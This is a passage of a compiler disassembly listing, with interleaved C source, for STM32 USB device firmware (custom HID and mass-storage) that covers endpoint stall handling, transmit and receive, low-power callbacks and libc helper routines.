  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_ClearStallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800ccb4:	b580      	push	{r7, lr}
 800ccb6:	b084      	sub	sp, #16
 800ccb8:	af00      	add	r7, sp, #0
 800ccba:	6078      	str	r0, [r7, #4]
 800ccbc:	460b      	mov	r3, r1
 800ccbe:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ccc0:	2300      	movs	r3, #0
 800ccc2:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ccc4:	2300      	movs	r3, #0
 800ccc6:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_ClrStall(pdev->pData, ep_addr);
 800ccc8:	687b      	ldr	r3, [r7, #4]
 800ccca:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800ccce:	78fa      	ldrb	r2, [r7, #3]
 800ccd0:	4611      	mov	r1, r2
 800ccd2:	4618      	mov	r0, r3
 800ccd4:	f7f5 fba6 	bl	8002424 <HAL_PCD_EP_ClrStall>
 800ccd8:	4603      	mov	r3, r0
 800ccda:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800ccdc:	7bbb      	ldrb	r3, [r7, #14]
 800ccde:	2b03      	cmp	r3, #3
 800cce0:	d816      	bhi.n	800cd10 <USBD_LL_ClearStallEP+0x5c>
 800cce2:	a201      	add	r2, pc, #4	; (adr r2, 800cce8 <USBD_LL_ClearStallEP+0x34>)
 800cce4:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cce8:	0800ccf9 	.word	0x0800ccf9
 800ccec:	0800ccff 	.word	0x0800ccff
 800ccf0:	0800cd05 	.word	0x0800cd05
 800ccf4:	0800cd0b 	.word	0x0800cd0b
    case HAL_OK :
      usb_status = USBD_OK;
 800ccf8:	2300      	movs	r3, #0
 800ccfa:	73fb      	strb	r3, [r7, #15]
    break;
 800ccfc:	e00b      	b.n	800cd16 <USBD_LL_ClearStallEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ccfe:	2303      	movs	r3, #3
 800cd00:	73fb      	strb	r3, [r7, #15]
    break;
 800cd02:	e008      	b.n	800cd16 <USBD_LL_ClearStallEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cd04:	2301      	movs	r3, #1
 800cd06:	73fb      	strb	r3, [r7, #15]
    break;
 800cd08:	e005      	b.n	800cd16 <USBD_LL_ClearStallEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cd0a:	2303      	movs	r3, #3
 800cd0c:	73fb      	strb	r3, [r7, #15]
    break;
 800cd0e:	e002      	b.n	800cd16 <USBD_LL_ClearStallEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cd10:	2303      	movs	r3, #3
 800cd12:	73fb      	strb	r3, [r7, #15]
    break;
 800cd14:	bf00      	nop
  }
  return usb_status;
 800cd16:	7bfb      	ldrb	r3, [r7, #15]
}
 800cd18:	4618      	mov	r0, r3
 800cd1a:	3710      	adds	r7, #16
 800cd1c:	46bd      	mov	sp, r7
 800cd1e:	bd80      	pop	{r7, pc}

0800cd20 <USBD_LL_IsStallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval Stall (1: Yes, 0: No)
  */
uint8_t USBD_LL_IsStallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cd20:	b480      	push	{r7}
 800cd22:	b085      	sub	sp, #20
 800cd24:	af00      	add	r7, sp, #0
 800cd26:	6078      	str	r0, [r7, #4]
 800cd28:	460b      	mov	r3, r1
 800cd2a:	70fb      	strb	r3, [r7, #3]
  PCD_HandleTypeDef *hpcd = (PCD_HandleTypeDef*) pdev->pData;
 800cd2c:	687b      	ldr	r3, [r7, #4]
 800cd2e:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cd32:	60fb      	str	r3, [r7, #12]

  if((ep_addr & 0x80) == 0x80)
 800cd34:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800cd38:	2b00      	cmp	r3, #0
 800cd3a:	da0c      	bge.n	800cd56 <USBD_LL_IsStallEP+0x36>
  {
    return hpcd->IN_ep[ep_addr & 0x7F].is_stall;
 800cd3c:	78fb      	ldrb	r3, [r7, #3]
 800cd3e:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800cd42:	68f9      	ldr	r1, [r7, #12]
 800cd44:	1c5a      	adds	r2, r3, #1
 800cd46:	4613      	mov	r3, r2
 800cd48:	009b      	lsls	r3, r3, #2
 800cd4a:	4413      	add	r3, r2
 800cd4c:	00db      	lsls	r3, r3, #3
 800cd4e:	440b      	add	r3, r1
 800cd50:	3302      	adds	r3, #2
 800cd52:	781b      	ldrb	r3, [r3, #0]
 800cd54:	e00b      	b.n	800cd6e <USBD_LL_IsStallEP+0x4e>
  }
  else
  {
    return hpcd->OUT_ep[ep_addr & 0x7F].is_stall;
 800cd56:	78fb      	ldrb	r3, [r7, #3]
 800cd58:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800cd5c:	68f9      	ldr	r1, [r7, #12]
 800cd5e:	4613      	mov	r3, r2
 800cd60:	009b      	lsls	r3, r3, #2
 800cd62:	4413      	add	r3, r2
 800cd64:	00db      	lsls	r3, r3, #3
 800cd66:	440b      	add	r3, r1
 800cd68:	f503 73b5 	add.w	r3, r3, #362	; 0x16a
 800cd6c:	781b      	ldrb	r3, [r3, #0]
  }
}
 800cd6e:	4618      	mov	r0, r3
 800cd70:	3714      	adds	r7, #20
 800cd72:	46bd      	mov	sp, r7
 800cd74:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cd78:	4770      	bx	lr
	...

0800cd7c <USBD_LL_SetUSBAddress>:
  * @param  pdev: Device handle
  * @param  dev_addr: Device address
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_SetUSBAddress(USBD_HandleTypeDef *pdev, uint8_t dev_addr)
{
 800cd7c:	b580      	push	{r7, lr}
 800cd7e:	b084      	sub	sp, #16
 800cd80:	af00      	add	r7, sp, #0
 800cd82:	6078      	str	r0, [r7, #4]
 800cd84:	460b      	mov	r3, r1
 800cd86:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cd88:	2300      	movs	r3, #0
 800cd8a:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cd8c:	2300      	movs	r3, #0
 800cd8e:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_SetAddress(pdev->pData, dev_addr);
 800cd90:	687b      	ldr	r3, [r7, #4]
 800cd92:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cd96:	78fa      	ldrb	r2, [r7, #3]
 800cd98:	4611      	mov	r1, r2
 800cd9a:	4618      	mov	r0, r3
 800cd9c:	f7f5 f97f 	bl	800209e <HAL_PCD_SetAddress>
 800cda0:	4603      	mov	r3, r0
 800cda2:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cda4:	7bbb      	ldrb	r3, [r7, #14]
 800cda6:	2b03      	cmp	r3, #3
 800cda8:	d816      	bhi.n	800cdd8 <USBD_LL_SetUSBAddress+0x5c>
 800cdaa:	a201      	add	r2, pc, #4	; (adr r2, 800cdb0 <USBD_LL_SetUSBAddress+0x34>)
 800cdac:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cdb0:	0800cdc1 	.word	0x0800cdc1
 800cdb4:	0800cdc7 	.word	0x0800cdc7
 800cdb8:	0800cdcd 	.word	0x0800cdcd
 800cdbc:	0800cdd3 	.word	0x0800cdd3
    case HAL_OK :
      usb_status = USBD_OK;
 800cdc0:	2300      	movs	r3, #0
 800cdc2:	73fb      	strb	r3, [r7, #15]
    break;
 800cdc4:	e00b      	b.n	800cdde <USBD_LL_SetUSBAddress+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cdc6:	2303      	movs	r3, #3
 800cdc8:	73fb      	strb	r3, [r7, #15]
    break;
 800cdca:	e008      	b.n	800cdde <USBD_LL_SetUSBAddress+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cdcc:	2301      	movs	r3, #1
 800cdce:	73fb      	strb	r3, [r7, #15]
    break;
 800cdd0:	e005      	b.n	800cdde <USBD_LL_SetUSBAddress+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cdd2:	2303      	movs	r3, #3
 800cdd4:	73fb      	strb	r3, [r7, #15]
    break;
 800cdd6:	e002      	b.n	800cdde <USBD_LL_SetUSBAddress+0x62>
    default :
      usb_status = USBD_FAIL;
 800cdd8:	2303      	movs	r3, #3
 800cdda:	73fb      	strb	r3, [r7, #15]
    break;
 800cddc:	bf00      	nop
  }
  return usb_status;
 800cdde:	7bfb      	ldrb	r3, [r7, #15]
}
 800cde0:	4618      	mov	r0, r3
 800cde2:	3710      	adds	r7, #16
 800cde4:	46bd      	mov	sp, r7
 800cde6:	bd80      	pop	{r7, pc}

0800cde8 <USBD_LL_Transmit>:
  * @param  pbuf: Pointer to data to be sent
  * @param  size: Data size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Transmit(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t *pbuf, uint32_t size)
{
 800cde8:	b580      	push	{r7, lr}
 800cdea:	b086      	sub	sp, #24
 800cdec:	af00      	add	r7, sp, #0
 800cdee:	60f8      	str	r0, [r7, #12]
 800cdf0:	607a      	str	r2, [r7, #4]
 800cdf2:	603b      	str	r3, [r7, #0]
 800cdf4:	460b      	mov	r3, r1
 800cdf6:	72fb      	strb	r3, [r7, #11]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cdf8:	2300      	movs	r3, #0
 800cdfa:	75bb      	strb	r3, [r7, #22]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cdfc:	2300      	movs	r3, #0
 800cdfe:	75fb      	strb	r3, [r7, #23]

  hal_status = HAL_PCD_EP_Transmit(pdev->pData, ep_addr, pbuf, size);
 800ce00:	68fb      	ldr	r3, [r7, #12]
 800ce02:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ce06:	7af9      	ldrb	r1, [r7, #11]
 800ce08:	683b      	ldr	r3, [r7, #0]
 800ce0a:	687a      	ldr	r2, [r7, #4]
 800ce0c:	f7f5 fa5a 	bl	80022c4 <HAL_PCD_EP_Transmit>
 800ce10:	4603      	mov	r3, r0
 800ce12:	75bb      	strb	r3, [r7, #22]

  switch (hal_status) {
 800ce14:	7dbb      	ldrb	r3, [r7, #22]
 800ce16:	2b03      	cmp	r3, #3
 800ce18:	d816      	bhi.n	800ce48 <USBD_LL_Transmit+0x60>
 800ce1a:	a201      	add	r2, pc, #4	; (adr r2, 800ce20 <USBD_LL_Transmit+0x38>)
 800ce1c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ce20:	0800ce31 	.word	0x0800ce31
 800ce24:	0800ce37 	.word	0x0800ce37
 800ce28:	0800ce3d 	.word	0x0800ce3d
 800ce2c:	0800ce43 	.word	0x0800ce43
    case HAL_OK :
      usb_status = USBD_OK;
 800ce30:	2300      	movs	r3, #0
 800ce32:	75fb      	strb	r3, [r7, #23]
    break;
 800ce34:	e00b      	b.n	800ce4e <USBD_LL_Transmit+0x66>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ce36:	2303      	movs	r3, #3
 800ce38:	75fb      	strb	r3, [r7, #23]
    break;
 800ce3a:	e008      	b.n	800ce4e <USBD_LL_Transmit+0x66>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ce3c:	2301      	movs	r3, #1
 800ce3e:	75fb      	strb	r3, [r7, #23]
    break;
 800ce40:	e005      	b.n	800ce4e <USBD_LL_Transmit+0x66>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ce42:	2303      	movs	r3, #3
 800ce44:	75fb      	strb	r3, [r7, #23]
    break;
 800ce46:	e002      	b.n	800ce4e <USBD_LL_Transmit+0x66>
    default :
      usb_status = USBD_FAIL;
 800ce48:	2303      	movs	r3, #3
 800ce4a:	75fb      	strb	r3, [r7, #23]
    break;
 800ce4c:	bf00      	nop
  }
  return usb_status;
 800ce4e:	7dfb      	ldrb	r3, [r7, #23]
}
 800ce50:	4618      	mov	r0, r3
 800ce52:	3718      	adds	r7, #24
 800ce54:	46bd      	mov	sp, r7
 800ce56:	bd80      	pop	{r7, pc}

0800ce58 <USBD_LL_PrepareReceive>:
  * @param  pbuf: Pointer to data to be received
  * @param  size: Data size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_PrepareReceive(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t *pbuf, uint32_t size)
{
 800ce58:	b580      	push	{r7, lr}
 800ce5a:	b086      	sub	sp, #24
 800ce5c:	af00      	add	r7, sp, #0
 800ce5e:	60f8      	str	r0, [r7, #12]
 800ce60:	607a      	str	r2, [r7, #4]
 800ce62:	603b      	str	r3, [r7, #0]
 800ce64:	460b      	mov	r3, r1
 800ce66:	72fb      	strb	r3, [r7, #11]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ce68:	2300      	movs	r3, #0
 800ce6a:	75bb      	strb	r3, [r7, #22]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ce6c:	2300      	movs	r3, #0
 800ce6e:	75fb      	strb	r3, [r7, #23]

  hal_status = HAL_PCD_EP_Receive(pdev->pData, ep_addr, pbuf, size);
 800ce70:	68fb      	ldr	r3, [r7, #12]
 800ce72:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ce76:	7af9      	ldrb	r1, [r7, #11]
 800ce78:	683b      	ldr	r3, [r7, #0]
 800ce7a:	687a      	ldr	r2, [r7, #4]
 800ce7c:	f7f5 f9d9 	bl	8002232 <HAL_PCD_EP_Receive>
 800ce80:	4603      	mov	r3, r0
 800ce82:	75bb      	strb	r3, [r7, #22]

  switch (hal_status) {
 800ce84:	7dbb      	ldrb	r3, [r7, #22]
 800ce86:	2b03      	cmp	r3, #3
 800ce88:	d816      	bhi.n	800ceb8 <USBD_LL_PrepareReceive+0x60>
 800ce8a:	a201      	add	r2, pc, #4	; (adr r2, 800ce90 <USBD_LL_PrepareReceive+0x38>)
 800ce8c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ce90:	0800cea1 	.word	0x0800cea1
 800ce94:	0800cea7 	.word	0x0800cea7
 800ce98:	0800cead 	.word	0x0800cead
 800ce9c:	0800ceb3 	.word	0x0800ceb3
    case HAL_OK :
      usb_status = USBD_OK;
 800cea0:	2300      	movs	r3, #0
 800cea2:	75fb      	strb	r3, [r7, #23]
    break;
 800cea4:	e00b      	b.n	800cebe <USBD_LL_PrepareReceive+0x66>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cea6:	2303      	movs	r3, #3
 800cea8:	75fb      	strb	r3, [r7, #23]
    break;
 800ceaa:	e008      	b.n	800cebe <USBD_LL_PrepareReceive+0x66>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ceac:	2301      	movs	r3, #1
 800ceae:	75fb      	strb	r3, [r7, #23]
    break;
 800ceb0:	e005      	b.n	800cebe <USBD_LL_PrepareReceive+0x66>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ceb2:	2303      	movs	r3, #3
 800ceb4:	75fb      	strb	r3, [r7, #23]
    break;
 800ceb6:	e002      	b.n	800cebe <USBD_LL_PrepareReceive+0x66>
    default :
      usb_status = USBD_FAIL;
 800ceb8:	2303      	movs	r3, #3
 800ceba:	75fb      	strb	r3, [r7, #23]
    break;
 800cebc:	bf00      	nop
  }
  return usb_status;
 800cebe:	7dfb      	ldrb	r3, [r7, #23]
}
 800cec0:	4618      	mov	r0, r3
 800cec2:	3718      	adds	r7, #24
 800cec4:	46bd      	mov	sp, r7
 800cec6:	bd80      	pop	{r7, pc}

0800cec8 <USBD_LL_GetRxDataSize>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval Received Data Size
  */
uint32_t USBD_LL_GetRxDataSize(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cec8:	b580      	push	{r7, lr}
 800ceca:	b082      	sub	sp, #8
 800cecc:	af00      	add	r7, sp, #0
 800cece:	6078      	str	r0, [r7, #4]
 800ced0:	460b      	mov	r3, r1
 800ced2:	70fb      	strb	r3, [r7, #3]
  return HAL_PCD_EP_GetRxCount((PCD_HandleTypeDef*) pdev->pData, ep_addr);
 800ced4:	687b      	ldr	r3, [r7, #4]
 800ced6:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800ceda:	78fa      	ldrb	r2, [r7, #3]
 800cedc:	4611      	mov	r1, r2
 800cede:	4618      	mov	r0, r3
 800cee0:	f7f5 f9d8 	bl	8002294 <HAL_PCD_EP_GetRxCount>
 800cee4:	4603      	mov	r3, r0
}
 800cee6:	4618      	mov	r0, r3
 800cee8:	3708      	adds	r7, #8
 800ceea:	46bd      	mov	sp, r7
 800ceec:	bd80      	pop	{r7, pc}
	...

0800cef0 <HAL_PCDEx_LPM_Callback>:
  * @param  hpcd: PCD handle
  * @param  msg: LPM message
  * @retval None
  */
void HAL_PCDEx_LPM_Callback(PCD_HandleTypeDef *hpcd, PCD_LPM_MsgTypeDef msg)
{
 800cef0:	b580      	push	{r7, lr}
 800cef2:	b082      	sub	sp, #8
 800cef4:	af00      	add	r7, sp, #0
 800cef6:	6078      	str	r0, [r7, #4]
 800cef8:	460b      	mov	r3, r1
 800cefa:	70fb      	strb	r3, [r7, #3]
  switch (msg)
 800cefc:	78fb      	ldrb	r3, [r7, #3]
 800cefe:	2b00      	cmp	r3, #0
 800cf00:	d002      	beq.n	800cf08 <HAL_PCDEx_LPM_Callback+0x18>
 800cf02:	2b01      	cmp	r3, #1
 800cf04:	d013      	beq.n	800cf2e <HAL_PCDEx_LPM_Callback+0x3e>
      /* Set SLEEPDEEP bit and SleepOnExit of Cortex System Control Register. */
      SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
    }
    break;
  }
}
 800cf06:	e023      	b.n	800cf50 <HAL_PCDEx_LPM_Callback+0x60>
    if (hpcd->Init.low_power_enable)
 800cf08:	687b      	ldr	r3, [r7, #4]
 800cf0a:	699b      	ldr	r3, [r3, #24]
 800cf0c:	2b00      	cmp	r3, #0
 800cf0e:	d007      	beq.n	800cf20 <HAL_PCDEx_LPM_Callback+0x30>
      SystemClockConfig_Resume();
 800cf10:	f000 f84a 	bl	800cfa8 <SystemClockConfig_Resume>
      SCB->SCR &= (uint32_t)~((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800cf14:	4b10      	ldr	r3, [pc, #64]	; (800cf58 <HAL_PCDEx_LPM_Callback+0x68>)
 800cf16:	691b      	ldr	r3, [r3, #16]
 800cf18:	4a0f      	ldr	r2, [pc, #60]	; (800cf58 <HAL_PCDEx_LPM_Callback+0x68>)
 800cf1a:	f023 0306 	bic.w	r3, r3, #6
 800cf1e:	6113      	str	r3, [r2, #16]
    USBD_LL_Resume(hpcd->pData);
 800cf20:	687b      	ldr	r3, [r7, #4]
 800cf22:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cf26:	4618      	mov	r0, r3
 800cf28:	f7fe fa66 	bl	800b3f8 <USBD_LL_Resume>
    break;
 800cf2c:	e010      	b.n	800cf50 <HAL_PCDEx_LPM_Callback+0x60>
    USBD_LL_Suspend(hpcd->pData);
 800cf2e:	687b      	ldr	r3, [r7, #4]
 800cf30:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cf34:	4618      	mov	r0, r3
 800cf36:	f7fe fa43 	bl	800b3c0 <USBD_LL_Suspend>
    if (hpcd->Init.low_power_enable)
 800cf3a:	687b      	ldr	r3, [r7, #4]
 800cf3c:	699b      	ldr	r3, [r3, #24]
 800cf3e:	2b00      	cmp	r3, #0
 800cf40:	d005      	beq.n	800cf4e <HAL_PCDEx_LPM_Callback+0x5e>
      SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800cf42:	4b05      	ldr	r3, [pc, #20]	; (800cf58 <HAL_PCDEx_LPM_Callback+0x68>)
 800cf44:	691b      	ldr	r3, [r3, #16]
 800cf46:	4a04      	ldr	r2, [pc, #16]	; (800cf58 <HAL_PCDEx_LPM_Callback+0x68>)
 800cf48:	f043 0306 	orr.w	r3, r3, #6
 800cf4c:	6113      	str	r3, [r2, #16]
    break;
 800cf4e:	bf00      	nop
}
 800cf50:	bf00      	nop
 800cf52:	3708      	adds	r7, #8
 800cf54:	46bd      	mov	sp, r7
 800cf56:	bd80      	pop	{r7, pc}
 800cf58:	e000ed00 	.word	0xe000ed00

0800cf5c <USBD_static_malloc>:
  * @brief  Static single allocation.
  * @param  size: Size of allocated memory
  * @retval None
  */
void *USBD_static_malloc(uint32_t size)
{
 800cf5c:	b480      	push	{r7}
 800cf5e:	b083      	sub	sp, #12
 800cf60:	af00      	add	r7, sp, #0
 800cf62:	6078      	str	r0, [r7, #4]
  static uint32_t mem[(sizeof(USBD_CUSTOM_HID_HandleTypeDef)/4+1)];/* On 32-bit boundary */
  return mem;
 800cf64:	4b03      	ldr	r3, [pc, #12]	; (800cf74 <USBD_static_malloc+0x18>)
}
 800cf66:	4618      	mov	r0, r3
 800cf68:	370c      	adds	r7, #12
 800cf6a:	46bd      	mov	sp, r7
 800cf6c:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cf70:	4770      	bx	lr
 800cf72:	bf00      	nop
 800cf74:	20000e74 	.word	0x20000e74

0800cf78 <USBD_static_malloc_MSC>:

void *USBD_static_malloc_MSC(uint32_t size)
{
 800cf78:	b480      	push	{r7}
 800cf7a:	b083      	sub	sp, #12
 800cf7c:	af00      	add	r7, sp, #0
 800cf7e:	6078      	str	r0, [r7, #4]
  static uint32_t mem[(sizeof(USBD_MSC_BOT_HandleTypeDef)/4+1)];/* On 32-bit boundary */
  return mem;
 800cf80:	4b03      	ldr	r3, [pc, #12]	; (800cf90 <USBD_static_malloc_MSC+0x18>)
}
 800cf82:	4618      	mov	r0, r3
 800cf84:	370c      	adds	r7, #12
 800cf86:	46bd      	mov	sp, r7
 800cf88:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cf8c:	4770      	bx	lr
 800cf8e:	bf00      	nop
 800cf90:	20000e9c 	.word	0x20000e9c

0800cf94 <USBD_static_free>:
  * @brief  Dummy memory free
  * @param  p: Pointer to allocated  memory address
  * @retval None
  */
void USBD_static_free(void *p)
{
 800cf94:	b480      	push	{r7}
 800cf96:	b083      	sub	sp, #12
 800cf98:	af00      	add	r7, sp, #0
 800cf9a:	6078      	str	r0, [r7, #4]

}
 800cf9c:	bf00      	nop
 800cf9e:	370c      	adds	r7, #12
 800cfa0:	46bd      	mov	sp, r7
 800cfa2:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cfa6:	4770      	bx	lr

0800cfa8 <SystemClockConfig_Resume>:
  * @brief  Configures system clock after wake-up from USB resume callBack:
  *         enable HSI, PLL and select PLL as system clock source.
  * @retval None
  */
static void SystemClockConfig_Resume(void)
{
 800cfa8:	b580      	push	{r7, lr}
 800cfaa:	af00      	add	r7, sp, #0
  SystemClock_Config();
 800cfac:	f7f3 fb26 	bl	80005fc <SystemClock_Config>
}
 800cfb0:	bf00      	nop
 800cfb2:	bd80      	pop	{r7, pc}

0800cfb4 <memset>:
 800cfb4:	4402      	add	r2, r0
 800cfb6:	4603      	mov	r3, r0
 800cfb8:	4293      	cmp	r3, r2
 800cfba:	d100      	bne.n	800cfbe <memset+0xa>
 800cfbc:	4770      	bx	lr
 800cfbe:	f803 1b01 	strb.w	r1, [r3], #1
 800cfc2:	e7f9      	b.n	800cfb8 <memset+0x4>

0800cfc4 <__libc_init_array>:
 800cfc4:	b570      	push	{r4, r5, r6, lr}
 800cfc6:	4d0d      	ldr	r5, [pc, #52]	; (800cffc <__libc_init_array+0x38>)
 800cfc8:	4c0d      	ldr	r4, [pc, #52]	; (800d000 <__libc_init_array+0x3c>)
 800cfca:	1b64      	subs	r4, r4, r5
 800cfcc:	10a4      	asrs	r4, r4, #2
 800cfce:	2600      	movs	r6, #0
 800cfd0:	42a6      	cmp	r6, r4
 800cfd2:	d109      	bne.n	800cfe8 <__libc_init_array+0x24>
 800cfd4:	4d0b      	ldr	r5, [pc, #44]	; (800d004 <__libc_init_array+0x40>)
 800cfd6:	4c0c      	ldr	r4, [pc, #48]	; (800d008 <__libc_init_array+0x44>)
 800cfd8:	f000 f826 	bl	800d028 <_init>
 800cfdc:	1b64      	subs	r4, r4, r5
 800cfde:	10a4      	asrs	r4, r4, #2
 800cfe0:	2600      	movs	r6, #0
 800cfe2:	42a6      	cmp	r6, r4
 800cfe4:	d105      	bne.n	800cff2 <__libc_init_array+0x2e>
 800cfe6:	bd70      	pop	{r4, r5, r6, pc}
 800cfe8:	f855 3b04 	ldr.w	r3, [r5], #4
 800cfec:	4798      	blx	r3
 800cfee:	3601      	adds	r6, #1
 800cff0:	e7ee      	b.n	800cfd0 <__libc_init_array+0xc>
 800cff2:	f855 3b04 	ldr.w	r3, [r5], #4
 800cff6:	4798      	blx	r3
 800cff8:	3601      	adds	r6, #1
 800cffa:	e7f2      	b.n	800cfe2 <__libc_init_array+0x1e>
 800cffc:	0800d1e0 	.word	0x0800d1e0
 800d000:	0800d1e0 	.word	0x0800d1e0
 800d004:	0800d1e0 	.word	0x0800d1e0
 800d008:	0800d1e4 	.word	0x0800d1e4

0800d00c <memcpy>:
 800d00c:	440a      	add	r2, r1
 800d00e:	4291      	cmp	r1, r2
 800d010:	f100 33ff 	add.w	r3, r0, #4294967295
 800d014:	d100      	bne.n	800d018 <memcpy+0xc>
 800d016:	4770      	bx	lr
 800d018:	b510      	push	{r4, lr}
 800d01a:	f811 4b01 	ldrb.w	r4, [r1], #1
 800d01e:	f803 4f01 	strb.w	r4, [r3, #1]!
 800d022:	4291      	cmp	r1, r2
 800d024:	d1f9      	bne.n	800d01a <memcpy+0xe>
 800d026:	bd10      	pop	{r4, pc}

0800d028 <_init>:
 800d028:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 800d02a:	bf00      	nop
 800d02c:	bcf8      	pop	{r3, r4, r5, r6, r7}
 800d02e:	bc08      	pop	{r3}
 800d030:	469e      	mov	lr, r3
 800d032:	4770      	bx	lr

0800d034 <_fini>:
 800d034:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 800d036:	bf00      	nop
 800d038:	bcf8      	pop	{r3, r4, r5, r6, r7}
 800d03a:	bc08      	pop	{r3}
 800d03c:	469e      	mov	lr, r3
 800d03e:	4770      	bx	lr
